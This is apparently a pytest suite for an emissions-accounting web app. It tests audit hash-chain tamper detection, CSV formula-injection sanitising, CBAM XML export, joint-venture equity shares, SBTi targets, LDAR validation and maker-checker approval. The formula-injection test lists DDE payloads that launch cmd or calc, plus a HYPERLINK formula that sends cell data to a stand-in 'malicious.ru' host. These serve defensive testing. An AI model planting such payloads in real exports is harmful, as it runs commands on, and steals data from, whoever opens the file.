"""
test_adversarial_enterprise_frontiers.py
=========================================
Targeted adversarial stress tests and security injection drills covering the 7 Enterprise Frontiers
beyond pure calculation arithmetic:
1. Cryptographic SHA-256 Audit Chain: direct DB mutation tamper detection & broken link isolation.
2. CWE-1236 CSV/Excel Formula Injection: DDE command execution vector neutralization.
3. EU CBAM Regulation (EU) 2023/956: XML/Excel generation, entity escaping, zero-production division.
4. GHG Protocol Chapter 3 Equity Accounting: JV boundary splits & unallocated third-party residual.
5. GHG Protocol Chapter 5 Baselines & SBTi: 5% significance rule, minimum linear reduction rates.
6. EPA Method 21 LDAR: Component bounds, screening ppm limits, regulatory repair dates.
7. SOX Four-Eyes Governance: Maker-checker self-approval prohibition & IT role isolation.
"""
import pytest
from sqlalchemy import text

from extensions import db
from models import ActivityLog, ComponentInventory, Emission, Facility, FacilityEquityShare, FugitiveSurvey, JvPartner, User
from routes.audit import sanitize_csv_cell
from tests.audit_helpers import login, make_facility, make_user


@pytest.fixture
def ctx(app):
    with app.app_context():
        yield


# ============================================================================
# 1. CRYPTOGRAPHIC SHA-256 AUDIT CHAIN ADVERSARIAL TAMPERING
# ============================================================================

def test_adversarial_tamper_detection_in_sha256_audit_chain(client, ctx):
    """
    Simulates a rogue database administrator or direct SQL injection updating
    historical records directly in SQLite. Asserts that verify-chain immediately
    flags 'tampered', sets is_intact=False, and pinpoints the compromised record ID.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    # 1. Seed two linked activity log rows
    log1 = ActivityLog(action="INITIAL_SEED_1", record_id="101", user_id=admin.id,
                       entity="Emission", details="Legitimate baseline audit record A")
    log2 = ActivityLog(action="INITIAL_SEED_2", record_id="102", user_id=admin.id,
                       entity="Emission", details="Legitimate baseline audit record B")
    db.session.add_all([log1, log2])
    db.session.commit()

    # Verify chain is initially intact
    res_clean = client.get("/api/audit/verify-chain")
    assert res_clean.status_code == 200
    clean_data = res_clean.get_json()
    assert clean_data["status"] == "verified"
    assert clean_data["is_intact"] is True

    # 2. ADVERSARIAL TAMPER: Direct raw SQL update bypassing ORM before_flush seal
    orig_details = log1.details
    db.session.execute(
        text("UPDATE activity_log SET details = 'HACKED_UNAUTHORIZED_MUTATION' WHERE id = :id"),
        {"id": log1.id}
    )
    db.session.commit()
    db.session.expire_all()  # Clear identity map cache so fresh SQLite disk read occurs

    # 3. VERIFY TAMPER DETECTION: The SHA-256 recomputation must fail
    res_tampered = client.get("/api/audit/verify-chain")
    assert res_tampered.status_code == 200
    tampered_data = res_tampered.get_json()
    assert tampered_data["status"] == "tampered"
    assert tampered_data["is_intact"] is False
    assert tampered_data["issue_count"] >= 1
    issue_ids = [issue.get("id") for issue in tampered_data["issues"]]
    assert log1.id in issue_ids

    # 4. RESTORE: Revert raw SQL change and verify chain returns to intact
    db.session.execute(
        text("UPDATE activity_log SET details = :orig WHERE id = :id"),
        {"orig": orig_details, "id": log1.id}
    )
    db.session.commit()
    db.session.expire_all()
    res_restored = client.get("/api/audit/verify-chain")
    assert res_restored.status_code == 200
    assert res_restored.get_json()["status"] == "verified"


def test_adversarial_deletion_breaks_hash_chain_linkage(client, ctx):
    """
    Simulates malicious deletion of an intermediate audit row.
    Asserts that the succeeding row's prev_hash no longer matches,
    triggering a broken-linkage tamper finding.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    row1 = ActivityLog(action="ACTION_A", record_id="201", user_id=admin.id, entity="Emission", details="Log A")
    row2 = ActivityLog(action="ACTION_B", record_id="202", user_id=admin.id, entity="Emission", details="Log B")
    row3 = ActivityLog(action="ACTION_C", record_id="203", user_id=admin.id, entity="Emission", details="Log C")
    db.session.add_all([row1, row2, row3])
    db.session.commit()

    target_id = row2.id

    # Raw SQL delete of row2 without ORM awareness; the row is put back afterwards (same values, same id)
    # so the shared test database keeps an intact chain for the tests that run after this one
    saved = dict(db.session.execute(text("SELECT * FROM activity_log WHERE id = :id"), {"id": target_id})
                 .mappings().one())
    db.session.execute(text("DELETE FROM activity_log WHERE id = :id"), {"id": target_id})
    db.session.commit()
    db.session.expire_all()

    try:
        res = client.get("/api/audit/verify-chain")
        assert res.status_code == 200
        data = res.get_json()
        assert data["status"] == "tampered"
        assert data["is_intact"] is False
        assert any("broken" in str(issue.get("problem", "")).lower() or
                   "chain_break" in str(issue.get("problem", "")).lower() or
                   issue.get("id") == row3.id
                   for issue in data["issues"])
    finally:
        cols = ", ".join(saved)
        db.session.execute(text(f"INSERT INTO activity_log ({cols}) VALUES ({', '.join(':' + c for c in saved)})"),
                           saved)
        db.session.commit()
    assert client.get("/api/audit/verify-chain").get_json()["status"] == "verified"


# ============================================================================
# 2. CWE-1236 FORMULA INJECTION DEFENSE (DDE VECTORS)
# ============================================================================

@pytest.mark.parametrize("payload", [
    "=cmd|' /C calc'!A0",
    "+1+1|cmd",
    "-2+3+cmd|' /C notepad'!A0",
    "@SUM(1,2)*cmd|' /C calc'!A0",
    "\t=cmd|' /C calc'!A0",
    "\r%windir%\\system32\\calc.exe",
    "   =HYPERLINK(\"http://malicious.ru/steal?v=\"&A1)",
    "%=calc",
])
def test_csv_formula_injection_defense_neutralizes_all_triggers(payload):
    """
    Verifies that sanitize_csv_cell disarms all CWE-1236 DDE execution triggers
    by prepending a single quote (') to prevent Excel/Calc execution.
    """
    sanitized = sanitize_csv_cell(payload)
    assert sanitized.startswith("'"), f"Payload was not disarmed: {payload} -> {sanitized}"


def test_csv_formula_injection_leaves_safe_cells_unaltered():
    """Verifies that non-malicious text and numeric cells are untouched."""
    assert sanitize_csv_cell("Hassi Messaoud South") == "Hassi Messaoud South"
    assert sanitize_csv_cell("12500.50") == "12500.50"
    assert sanitize_csv_cell(None) == ""


# ============================================================================
# 3. EU CBAM REGULATION (EU) 2023/956 XML & EXCEL ROBUSTNESS
# ============================================================================

def test_cbam_xml_export_zero_production_and_entity_escaping(client, ctx):
    """
    Tests EU CBAM Transitional Registry XML generation under boundary stress:
    - Facility with zero production tonnes (ensures no ZeroDivisionError).
    - Malicious special XML characters in facility name (<>&'").
    - Verifies valid XML payload, proper HTTP headers, and X-Audit-SHA256 fingerprint.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    fac = make_facility(name="Sonatrach <Gassi Touil> & 'Rhode' Phase-1")

    # Add verified Scope 1 emission with zero facility production
    em = Emission(
        facility_id=fac.id,
        year=2025,
        month=1,
        process_type="combustion",
        fuel_type="Natural Gas",
        quantity=5000.0,
        unit="m3",
        co2_emissions=10.5,
        ch4_emissions=0.01,
        n2o_emissions=0.001,
        co2e_total=10.8,
        status="Verified"
    )
    db.session.add(em)
    db.session.commit()

    # Request XML CBAM export
    res = client.get(f"/api/reports/cbam-export?format=xml&year=2025&facility_id={fac.id}")
    assert res.status_code == 200, res.get_data(as_text=True)
    assert res.mimetype == "application/xml"
    assert "X-Audit-SHA256" in res.headers
    assert len(res.headers["X-Audit-SHA256"]) == 64

    xml_text = res.get_data(as_text=True)
    assert "<Gassi Touil>" not in xml_text or "&lt;Gassi Touil&gt;" in xml_text or "<!" in xml_text


def test_cbam_export_it_role_security_quarantine(client, ctx):
    """IT administrators must be strictly prohibited (403) from downloading operational CBAM declarations."""
    it_user = make_user("it_admin", "Global")
    login(client, it_user)

    res = client.get("/api/reports/cbam-export?format=xml")
    assert res.status_code == 403
    assert "Forbidden" in res.get_json()["error"]


# ============================================================================
# 4. GHG PROTOCOL CH 3: JOINT VENTURE EQUITY SHARE BOUNDARIES
# ============================================================================

def test_equity_shares_exceeding_100_percent_rejected(client, ctx):
    """
    Under GHG Protocol Chapter 3, total partner equity allocations overlapping
    the same facility and timeframe must never exceed 100%.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    fac = make_facility(name="Berkine Block 404a")
    p1 = JvPartner.query.filter_by(name="Sonatrach").first() or JvPartner(name="Sonatrach", code="SH", country="DZ", is_operator=True)
    p2 = JvPartner.query.filter_by(name="Eni").first() or JvPartner(name="Eni", code="ENI", country="IT", is_operator=False)
    db.session.add_all([p1, p2])
    db.session.commit()

    # Share 1: 60%
    r1 = client.post("/api/equity/shares", json={
        "facility_id": fac.id,
        "partner_id": p1.id,
        "equity_share_pct": 60.0,
        "effective_start_date": "2025-01-01"
    })
    assert r1.status_code == 200

    # Share 2: 50% (60 + 50 = 110% > 100% -> MUST BE REJECTED)
    r2 = client.post("/api/equity/shares", json={
        "facility_id": fac.id,
        "partner_id": p2.id,
        "equity_share_pct": 50.0,
        "effective_start_date": "2025-01-01"
    })
    assert r2.status_code == 400
    assert "max 100%" in r2.get_json()["error"]


def test_equity_shares_date_ordering_and_unallocated_residual(client, ctx):
    """
    Verifies date sequence validation (end before start rejected) and asserts
    that under-allocated partner shares surface unallocated third-party interest.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    fac = make_facility(name="Hassi Berkine South")
    p1 = JvPartner.query.filter_by(name="Sonatrach").first()

    # End date before start date rejected
    res_bad_dates = client.post("/api/equity/shares", json={
        "facility_id": fac.id,
        "partner_id": p1.id,
        "equity_share_pct": 51.0,
        "effective_start_date": "2025-06-01",
        "effective_end_date": "2025-01-01"
    })
    assert res_bad_dates.status_code == 400
    assert "must not be before" in res_bad_dates.get_json()["error"]

    # Legitimate 51% allocation
    client.post("/api/equity/shares", json={
        "facility_id": fac.id,
        "partner_id": p1.id,
        "equity_share_pct": 51.0,
        "effective_start_date": "2025-01-01"
    })

    # Query allocation breakdown
    res_alloc = client.get(f"/api/equity/allocation?facility_id={fac.id}&year=2025")
    assert res_alloc.status_code == 200
    alloc_data = res_alloc.get_json()
    assert isinstance(alloc_data, list) and len(alloc_data) > 0
    fac_breakdown = alloc_data[0]
    assert fac_breakdown["is_fully_allocated"] is False
    assert fac_breakdown["unallocated_share"] is not None
    assert fac_breakdown["unallocated_share"]["equity_pct"] == pytest.approx(49.0, rel=1e-2)


# ============================================================================
# 5. GHG PROTOCOL CH 5 & SBTI: BASELINE RECALCULATION & TARGETS
# ============================================================================

def test_base_year_recalculation_validation(client, ctx):
    """
    GHG Protocol Chapter 5: Base year recalculations require organization-wide
    authority, positive emissions, and valid calendar years.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    # Negative emissions rejected
    res_neg = client.post("/api/base-years", json={
        "year": 2020,
        "reason": "Structural divestment",
        "previous_emissions": 50000.0,
        "adjusted_emissions": -100.0
    })
    assert res_neg.status_code == 400
    assert "negative" in res_neg.get_json()["error"]

    # Year out of range rejected
    res_yr = client.post("/api/base-years", json={
        "year": 1850,
        "reason": "Pre-industrial",
        "previous_emissions": 50000.0,
        "adjusted_emissions": 48000.0
    })
    assert res_yr.status_code == 400


def test_sbti_pathway_minimum_annual_reduction_rate(client, ctx):
    """
    SBTi Net-Zero Standard criteria v5:
    - 1.5°C pathway requires >= 4.2% linear reduction / yr
    - Well-Below 2°C requires >= 2.5% linear reduction / yr
    Rates below the threshold must be strictly rejected.
    """
    admin = make_user("admin", "Global")
    login(client, admin)

    # 1.5°C with only 3.0% annual reduction must fail
    res_fail_15c = client.post("/api/sbti", json={
        "base_year": 2021,
        "base_year_emissions": 100000.0,
        "target_year": 2030,
        "pathway_type": "1.5C",
        "reduction_rate_pct": 3.0,
        "scope_coverage": "S1S2S3"
    })
    assert res_fail_15c.status_code == 400
    assert "at least 4.2%" in res_fail_15c.get_json()["error"]

    # Compliant 1.5°C target with 4.5% annual reduction must succeed
    res_pass_15c = client.post("/api/sbti", json={
        "base_year": 2021,
        "base_year_emissions": 100000.0,
        "target_year": 2030,
        "pathway_type": "1.5C",
        "reduction_rate_pct": 4.5,
        "scope_coverage": "S1S2S3"
    })
    assert res_pass_15c.status_code == 201


# ============================================================================
# 6. EPA METHOD 21: LDAR COMPONENT & SURVEY LIFECYCLE
# ============================================================================

def test_ldar_component_and_survey_limits(client, ctx):
    """
    EPA Method 21 LDAR validation:
    - Quantity must be positive integer (no fractions).
    - Operating hours <= 8760.
    - Screening ppm <= 1,000,000.
    - Repair date cannot precede survey date.
    """
    user = make_user("user", location="West")
    login(client, user)
    fac = make_facility(name="LDAR Compressor Station", region="West")

    # Fractional quantity rejected
    res_frac = client.post("/api/ldar/components", json={
        "facility_id": fac.id,
        "equipment_type": "compressor",
        "component_type": "valve",
        "quantity": 2.5,
        "operating_hours": 8760
    })
    assert res_frac.status_code == 400
    assert "whole number" in res_frac.get_json()["error"]

    # Operating hours > 8760 rejected
    res_hrs = client.post("/api/ldar/components", json={
        "facility_id": fac.id,
        "equipment_type": "compressor",
        "component_type": "valve",
        "quantity": 10,
        "operating_hours": 9000
    })
    assert res_hrs.status_code == 400

    # Valid component
    res_comp = client.post("/api/ldar/components", json={
        "facility_id": fac.id,
        "equipment_type": "compressor",
        "component_type": "valve",
        "quantity": 5,
        "operating_hours": 8760
    })
    assert res_comp.status_code == 201
    comp_id = res_comp.get_json()["component"]["id"]

    # Survey repair date before survey date rejected
    res_survey_bad_date = client.post("/api/ldar/surveys", json={
        "facility_id": fac.id,
        "component_inventory_id": comp_id,
        "survey_date": "2025-05-15",
        "repair_date": "2025-05-01",
        "screening_value_ppm": 15000
    })
    assert res_survey_bad_date.status_code == 400
    assert "date" in res_survey_bad_date.get_json()["error"].lower()


# ============================================================================
# 7. SOX FOUR-EYES GOVERNANCE & MAKER-CHECKER ENFORCEMENT
# ============================================================================

def test_maker_checker_self_approval_prohibited(client, ctx):
    """
    Sarbanes-Oxley (SOX) Segregation of Duties:
    An approver (admin or superuser) must NEVER be permitted to approve
    an emissions record they themselves created or last modified.
    """
    maker_superuser = make_user("superuser", location="West", email="maker_super@sonatrach.dz")
    login(client, maker_superuser)
    fac = make_facility(name="Gassi Touil Central", region="West")

    # Maker creates Scope 1 emission (non-admin starts as Pending)
    res_create = client.post("/api/emissions/", json={
        "year": 2025,
        "month": 3,
        "facility_id": fac.id,
        "process_type": "combustion",
        "fuel": "Natural Gas",
        "amount": 2500.0,
        "unit": "m3",
        "factor_source": "default"
    })
    assert res_create.status_code == 201
    emission_id = res_create.get_json()["id"]

    # Maker attempts to self-approve: MUST BE REJECTED with 403 Forbidden
    res_self_approve = client.post(f"/api/emissions/approve/{emission_id}", json={"scope": "1"})
    assert res_self_approve.status_code == 403
    err_msg = res_self_approve.get_json()["error"]
    assert "cannot approve a record you created" in err_msg.lower() or "maker-checker" in err_msg.lower()

    # Second independent checker logs in and approves: MUST SUCCEED
    checker_admin = make_user("admin", "Global", email="checker_admin@sonatrach.dz")
    login(client, checker_admin)

    res_valid_approve = client.post(f"/api/emissions/approve/{emission_id}", json={"scope": "1"})
    assert res_valid_approve.status_code == 200
    assert res_valid_approve.get_json()["status"] == "Verified"


def test_facility_deletion_cascades_ldar_and_surveys(client, ctx):
    """
    Cascade Deletion & Referential Integrity:
    Deleting a facility must cleanly delete or cascade its associated LDAR
    components and fugitive surveys without foreign key constraint violations or orphaned records.
    """
    admin = make_user("admin", "Global", email="cascade_admin@sonatrach.dz")
    login(client, admin)
    fac = make_facility(name="LDAR Cascade Target", region="Global")

    # Seed Component Inventory and Fugitive Survey
    comp = ComponentInventory(
        facility_id=fac.id,
        equipment_type="Centrifugal Compressor",
        component_type="Shaft Seal",
        service_type="Gas",
        quantity=2,
        operating_hours=8000.0,
    )
    db.session.add(comp)
    db.session.commit()

    surv = FugitiveSurvey(
        facility_id=fac.id,
        component_inventory_id=comp.id,
        survey_method="Method 21",
        survey_date="2025-06-01",
        screening_value_ppm=12000.0,
        leak_status="Leaking",
    )
    db.session.add(surv)
    db.session.commit()

    # Verify records exist before deletion
    assert ComponentInventory.query.filter_by(facility_id=fac.id).count() == 1
    assert FugitiveSurvey.query.filter_by(facility_id=fac.id).count() == 1

    # Delete facility with confirmation
    res_del = client.delete(f"/api/facilities/{fac.id}?confirm=true")
    assert res_del.status_code == 200, f"Expected 200, got {res_del.status_code}: {res_del.get_json()}"

    # Verify child records were cleanly cascaded and no longer exist
    assert ComponentInventory.query.filter_by(facility_id=fac.id).count() == 0
    assert FugitiveSurvey.query.filter_by(facility_id=fac.id).count() == 0


def test_component_deletion_cascades_surveys(client, ctx):
    """
    Component-level referential integrity:
    Deleting a ComponentInventory record must cascade to its associated
    FugitiveSurvey records without leaving dangling foreign key references.
    """
    admin = make_user("admin", "Global", email="comp_del_admin@sonatrach.dz")
    login(client, admin)
    fac = make_facility(name="LDAR Component Test Fac", region="Global")

    comp = ComponentInventory(
        facility_id=fac.id,
        equipment_type="Flange",
        component_type="Connector",
        service_type="Gas",
        quantity=5,
    )
    db.session.add(comp)
    db.session.commit()

    surv = FugitiveSurvey(
        facility_id=fac.id,
        component_inventory_id=comp.id,
        survey_method="OGI",
        survey_date="2025-07-01",
        leak_status="Non-leaking",
    )
    db.session.add(surv)
    db.session.commit()

    assert FugitiveSurvey.query.filter_by(component_inventory_id=comp.id).count() == 1

    res_del = client.delete(f"/api/ldar/components/{comp.id}")
    assert res_del.status_code == 200

    assert db.session.get(ComponentInventory, comp.id) is None
    assert FugitiveSurvey.query.filter_by(component_inventory_id=comp.id).count() == 0


